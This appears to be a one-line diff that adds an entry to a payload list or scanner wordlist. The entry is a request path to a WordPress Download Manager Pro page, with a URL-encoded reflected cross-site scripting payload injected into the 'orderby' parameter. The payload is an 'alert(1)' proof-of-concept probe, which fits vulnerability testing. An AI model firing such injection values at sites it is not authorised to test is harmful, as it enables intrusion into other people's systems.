@@ -1,0 +1,1 @@
+/wpdmpro/list-packages/?orderby=title%22%3E%3Cscript%3Ealert(1)%3C/script%3E&order=asc
